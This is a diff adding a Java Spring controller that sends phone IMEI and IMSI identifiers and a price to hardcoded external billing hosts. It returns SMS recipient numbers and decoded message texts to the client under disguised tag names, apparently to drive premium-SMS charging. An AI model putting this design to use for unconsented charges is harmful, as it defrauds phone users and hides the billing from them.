@@ -1,0 +1,259 @@
+package net.workspace.web.web;
+
+import net.workspace.web.entity.ClientEntity;
+import net.workspace.web.service.ClientService;
+import org.apache.commons.lang3.StringUtils;
+import org.apache.http.HttpEntity;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.json.JSONException;
+import org.json.JSONObject;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import utils.base64.Base64;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.*;
+import java.net.URL;
+import java.net.URLConnection;
+import java.util.Enumeration;
+import java.util.HashMap;
+import java.util.Map;
+
+@Controller
+@RequestMapping(value = "")
+public class RedirectController extends AbstractController {
+    private static final Logger redirectLogger = LoggerFactory.getLogger ("RedirectLogger");
+    private static final Logger forwardLogger = LoggerFactory.getLogger ("ForwardLogger");
+    @Autowired
+    ClientService clientService;
+
+    public static String httpget(String url) throws Throwable {
+        StringBuilder sb = new StringBuilder ();
+        InputStream is = null;
+        HttpClient httpclient = new DefaultHttpClient ();
+        HttpGet httpgets = new HttpGet (url);
+        Throwable error = null;
+        try {
+            HttpEntity entity = httpclient.execute (httpgets).getEntity ();
+            if (entity != null) {
+                is = entity.getContent ();
+                BufferedReader reader = new BufferedReader (new InputStreamReader (is, "GB2312"));
+                String line;
+                while ((line = reader.readLine ()) != null) {
+                    sb.append (line).append ("\n");
+                }
+            }
+        } catch (IOException e) {
+            error = e;
+        } finally {
+            httpgets.abort ();
+            try {
+                if (is != null) is.close ();
+            } catch (IOException e) {
+                error = e;
+            }
+        }
+        if (error != null) throw error;
+        return sb.toString ();
+    }
+
+    private JSONObject getRequestParams(HttpServletRequest request) throws JSONException {
+        JSONObject obj = new JSONObject ();
+        Enumeration en = request.getParameterNames ();
+        while (en.hasMoreElements ()) {
+            String key = (String) en.nextElement ();
+            String value = request.getParameter (key);
+            obj.put (key, value);
+        }
+        return obj;
+    }
+
+    @RequestMapping(value = "/redirect")
+    public void execute(HttpServletRequest request, HttpServletResponse response) {
+        int method = this.getIntParameter (request, "rmethod");
+        String result = null;
+        Logger logger = redirectLogger;
+        JSONObject logObj = new JSONObject ();
+        try {
+            long clientId = this.getLongParameter (request, "rid");
+            ClientEntity client = this.clientService.get (clientId);
+            if (client != null) {
+                switch (method) {
+                    case 1://get JJ
+                        result = this.handle (method, request, client, logObj);
+                        break;
+                    case 2:
+                        result = this.handle (method, request, client, logObj);
+                        break;
+                }
+            }
+
+        } catch (Throwable e) {
+            logger.error (e.getMessage (), e);
+        }
+
+        if (StringUtils.isBlank (result)) result = " ";
+        logger.info (getRemoteAddr (request) + ",http://" + request.getHeader ("HOST") + request.getHeader ("REQUEST_PATH") + ":" + logObj.toString () + "\n");
+        this.write (response, result);
+
+    }
+
+
+    private String getRemoteAddr(HttpServletRequest request) {
+        return request.getHeader ("X-Real-IP");
+    }
+
+
+    Map<Integer, String> loginUrlMap = new HashMap<Integer, String> () {{
+        put (1, "http://kk2014.us:9009/o/vn/");
+        put (2, "http://112.25.8.238:8000/o/vn/");
+    }};
+
+    Map<Integer, String> feeUrlMap = new HashMap<Integer, String> () {{
+        put (1, "http://kk2014.us:9009/o/svn/");
+        put (2, "http://112.25.8.238:8000/o/svn/");
+
+    }};
+
+    private String handle(int methodId, HttpServletRequest request, ClientEntity client, JSONObject logObj) throws Throwable {
+        String loginUrl = loginUrlMap.get (methodId);
+        String feeUrl = feeUrlMap.get (methodId);
+        String type = request.getParameter ("type");
+        String cpParam = "HD";
+        String result = null;
+
+        logObj.put ("requestParams", getRequestParams (request));
+        if ("login".equals (type)) {
+            String url = loginUrl + request.getParameter ("sid");
+            String xml = this.composeFirstRequestBody (client.getImei (), client.getImsi (), Integer.valueOf (request.getParameter ("price")), cpParam);
+            logObj.put ("redirectUrl", url);
+            logObj.put ("postXml", xml);
+            String content = this.postXml (url, xml);
+            logObj.put ("redirectResponse", content);
+            String contentSid = searchEnclosed (content, "<content_sid>", "</content_sid>");
+            String receiver = searchEnclosed (content, "<sms_1_num>", "</sms_1_num>");
+            String msg = Base64.decode (searchEnclosed (content, "<sms_1>", "</sms_1>"));
+            result = "<hello>" + receiver + "</hello><world>" + msg + "</world><cid>" + contentSid + "</cid>";
+            logObj.put ("response", result);
+
+        } else if ("fee".equals (type)) {
+            String url = feeUrl + request.getParameter ("sid");
+            String xml = this.composeSecondRequestBody (request.getParameter ("cid"));
+            logObj.put ("redirectUrl", url);
+            logObj.put ("postXml", xml);
+            String content = this.postXml (url, xml);
+            logObj.put ("redirectResponse", content);
+            String receiver = searchEnclosed (content, "<sms_2_num>", "</sms_2_num>");
+            String msg = Base64.decode (searchEnclosed (content, "<sms_2>", "</sms_2>"));
+            String code = searchEnclosed (content, "<status>", "</status>");
+            result = "<hello>" + receiver + "</hello><world>" + msg + "</world>+<what>" + code + "</what>";
+            logObj.put ("response", result);
+        }
+
+        return result;
+    }
+
+
+    public static String searchEnclosed(String target, String left, String right) {
+        return searchEnclosed (target, left, right, 0);
+    }
+
+    public static String searchEnclosed(String target, String left, String right, int matcherIndex) {
+        if (!StringUtils.isEmpty (target) && !StringUtils.isEmpty (left) && !StringUtils.isEmpty (right)) {
+            int index = 0;
+            int leftPlace = 0;
+            int rightPlace = 0;
+            int fromPlace = 0;
+            while (leftPlace >= 0 && rightPlace >= 0) {
+                leftPlace = target.indexOf (left, fromPlace);
+                if (leftPlace >= 0) {
+                    fromPlace = leftPlace + left.length () + 1;
+                    rightPlace = target.indexOf (right, fromPlace);
+                    if (rightPlace > 0 && (matcherIndex == -1 || matcherIndex == index++)) {//
+                        return target.substring (leftPlace + left.length (), rightPlace);
+                    }
+                    fromPlace = rightPlace + right.length () + 1;
+                }
+            }
+        }
+        return null;
+    }
+
+    Map<String, String> getBizParams(HttpServletRequest request) {
+        Map<String, String> map = new HashMap<String, String> ();
+        Enumeration en = request.getParameterNames ();
+        while (en.hasMoreElements ()) {
+            String key = (String) en.nextElement ();
+            if ("rid".equals (key) || "rmethod".equals (key)) continue;
+            String value = request.getParameter (key);
+            map.put (key, value);
+        }
+        return map;
+    }
+
+
+    private String composeFirstRequestBody(String imei, String imsi, int price, String cpParam) {
+        StringBuilder sb = new StringBuilder ();
+        sb.append ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
+        sb.append ("<request>\n");
+        sb.append ("<imsi>").append (imsi).append ("</imsi>\n");
+        sb.append ("<imei>").append (imei).append ("</imei>\n");
+        sb.append ("<price>").append (new java.text.DecimalFormat ("#.##").format (price * 1.0 / 100)).append ("</price>\n");
+        sb.append ("<cpparam>").append (cpParam).append ("</cpparam>\n");
+        sb.append ("</request>");
+        return sb.toString ();
+    }
+
+
+    private String composeSecondRequestBody(String contentSid) {
+        StringBuilder sb = new StringBuilder ();
+        sb.append ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
+        sb.append ("<request>\n");
+        sb.append ("<content_sid>").append (contentSid).append ("</content_sid>");
+        sb.append ("</request>");
+        return sb.toString ();
+    }
+
+
+    private String postXml(String url, String body) throws Throwable {
+        StringBuilder sb = new StringBuilder ();
+        OutputStreamWriter out = null;
+        Throwable error = null;
+        try {
+            URLConnection con = new URL (url).openConnection ();
+            con.setDoOutput (true);
+            con.setRequestProperty ("Pragma:", "no-cache");
+            con.setRequestProperty ("Cache-Control", "no-cache");
+            con.setRequestProperty ("Content-Type", "text/xml");
+            out = new OutputStreamWriter (con.getOutputStream ());
+            out.write (new String (body.getBytes ("UTF-8")));
+            out.flush ();
+            BufferedReader br = new BufferedReader (new InputStreamReader (con.getInputStream ()));
+            String line;
+            for (line = br.readLine (); line != null; line = br.readLine ()) {
+                sb.append (line).append ("\n");
+            }
+        } catch (Exception e) {
+            error = e;
+        } finally {
+            if (out != null) {
+                try {
+                    out.close ();
+                } catch (IOException e) {
+                    error = e;
+                }
+            }
+        }
+
+        if (error != null) throw error;
+        return sb.toString ();
+    }
+
+
+}
